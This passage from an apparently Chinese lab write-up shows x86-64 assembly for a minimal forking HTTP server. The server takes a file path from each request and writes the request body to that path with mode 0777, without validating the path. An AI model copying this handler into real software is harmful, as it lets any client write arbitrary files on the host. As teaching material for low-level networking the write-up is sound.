class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .text<br><span class="hljs-symbol">_start:</span>     <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">2</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="hljs-number">3</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">41</span> <br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # bind(<span class="hljs-number">3</span>, &#123;sa_family=AF_INET, sin_port=htons(<span class="hljs-number">80</span>), sin_addr=inet_addr(<span class="hljs-string">&quot;0.0.0.0&quot;</span>)&#125;, <span class="hljs-number">16</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rip</span>+socket_addr]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">16</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">49</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # listen(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">50</span><br>    <span class="hljs-keyword">syscall</span> <br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # accept(<span class="hljs-number">3</span>, NULL, NULL) = <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">43</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">57</span>     # fork()<br>    <span class="hljs-keyword">syscall</span><br>    <br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">je</span> child_process<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # close(<span class="hljs-number">4</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # accept(<span class="hljs-number">3</span>, NULL, NULL) = <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">43</span><br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">jmp</span> done<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">child_process:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # close(<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # read(<span class="hljs-number">4</span>,buf,count_bytes)<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">512</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer+<span class="hljs-number">5</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, file_path<br><span class="hljs-symbol">loop_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsi</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0x20</span><br>    <span class="hljs-keyword">je</span> get_file_path<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span>], <span class="hljs-built_in">al</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">jmp</span> loop_start<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">get_file_path:</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, file_path  # open(<span class="hljs-string">&quot;file_path&quot;</span>, O_WRONLY|O_CREAT, <span class="hljs-number">0777</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">01</span>|<span class="hljs-number">0100</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0x1FF</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, content<br>    <span class="hljs-keyword">dec</span> <span class="hljs-built_in">r8</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">loop2_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [buffer + <span class="hljs-built_in">r8</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0xa</span><br>    <span class="hljs-keyword">je</span> get_content_str<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span>], <span class="hljs-built_in">al</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">dec</span> <span class="hljs-built_in">r8</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">jmp</span> loop2_start<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">get_content_str:</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, reverse_content<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">dec</span> <span class="hljs-built_in">r9</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rcx</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">loop3_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [content + <span class="hljs-built_in">r9</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">je</span> get_reverse_str<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span>], <span class="hljs-built_in">al</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">dec</span> <span class="hljs-built_in">r9</span><br>    <span class="hljs-keyword">jmp</span> loop3_start<br><span class="hljs-symbol">get_reverse_str:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # write(<span class="hljs-number">3</span>, content, content_length)<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, reverse_content<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">syscall</span><br>    <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # close(<span class="hljs-number">3</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # write(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span>, <span class="hljs-number">19</span>) = <span class="hljs-number">19</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>,[<span class="hljs-built_in">rip</span> + ret_normal_msg] <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">19</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">0</span>       # SYS_exit<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">done:</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .data<br><span class="hljs-symbol">socket_addr:</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">2</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">0x5000</span><br><span class="hljs-meta">    .4byte</span> <span class="hljs-number">0</span><br><span class="hljs-meta">    .8byte</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">ret_normal_msg:</span><br><span class="hljs-meta">    .ascii</span> <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="hljs-symbol">buffer:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">512</span><br><span class="hljs-symbol">file_path:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">64</span> <br><span class="hljs-symbol">content:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">256</span><br><span class="hljs-symbol">reverse_content:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">256</span><br><br></code></pre></td></tr></table></figure><p>总共三个循环，还是挺复杂的。主要是有更简单的方法。<code>!</code>使用<code>\n</code>的索引即可。如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .text<br><span class="hljs-symbol">_start:</span>     <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">2</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="hljs-number">3</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">41</span> <br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # bind(<span class="hljs-number">3</span>, &#123;sa_family=AF_INET, sin_port=htons(<span class="hljs-number">80</span>), sin_addr=inet_addr(<span class="hljs-string">&quot;0.0.0.0&quot;</span>)&#125;, <span class="hljs-number">16</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rip</span>+socket_addr]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">16</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">49</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # listen(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">50</span><br>    <span class="hljs-keyword">syscall</span> <br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # accept(<span class="hljs-number">3</span>, NULL, NULL) = <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">43</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">57</span>     # fork()<br>    <span class="hljs-keyword">syscall</span><br>    <br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">je</span> child_process<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # close(<span class="hljs-number">4</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # accept(<span class="hljs-number">3</span>, NULL, NULL) = <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">43</span><br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">jmp</span> done<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">child_process:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # close(<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # read(<span class="hljs-number">4</span>,buf,count_bytes)<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">512</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer+<span class="hljs-number">5</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, file_path<br><span class="hljs-symbol">loop_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsi</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0x20</span><br>    <span class="hljs-keyword">je</span> get_file_path<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span>], <span class="hljs-built_in">al</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">jmp</span> loop_start<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">get_file_path:</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, file_path  # open(<span class="hljs-string">&quot;file_path&quot;</span>, O_WRONLY|O_CREAT, <span class="hljs-number">0777</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">01</span>|<span class="hljs-number">0100</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0x1FF</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span><br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r12</span>, <span class="hljs-number">8</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, content<br><span class="hljs-symbol">loop2_start:</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r12</span><br>    <span class="hljs-keyword">jge</span> get_content<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsi</span>]<br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">r9</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">al</span>, <span class="hljs-string">&#x27;\n&#x27;</span><br>    <span class="hljs-keyword">je</span> get_index <br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">jmp</span> loop2_start<br><span class="hljs-symbol">get_index:</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">r8</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">jmp</span> loop2_start<br><span class="hljs-symbol">get_content:</span><br>    <span class="hljs-keyword">sub</span> <span class="hljs-built_in">r10</span>, <span class="hljs-built_in">r9</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # write(<span class="hljs-number">3</span>, content, content_length)<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer<br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">r9</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">r10</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">syscall</span><br>    <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # close(<span class="hljs-number">3</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # write(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span>, <span class="hljs-number">19</span>) = <span class="hljs-number">19</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>,[<span class="hljs-built_in">rip</span> + ret_normal_msg] <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">19</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">0</span>       # SYS_exit<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">done:</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .data<br><span class="hljs-symbol">socket_addr:</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">2</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">0x5000</span><br><span class="hljs-meta">    .4byte</span> <span class="hljs-number">0</span><br><span class="hljs-meta">    .8byte</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">ret_normal_msg:</span><br><span class="hljs-meta">    .ascii</span> <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="hljs-symbol">buffer:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">512</span><br><span class="hljs-symbol">file_path:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">64</span> <br><span class="hljs-symbol">content:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">256</span><br><span class="hljs-symbol">reverse_content:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">256</span><br></code></pre></td></tr></table></figure><h4 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h4><p>这道题的关键就是多线程，也就是父进程需要不断地接收新的连接，并fork出子进程来处理这个连接，然后再接收新的连接，再fork出子进程来处理。因此，子进程部分就是level9和level10的结合。额外加一个循环，让父进程不断地accept和fork就好了。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span 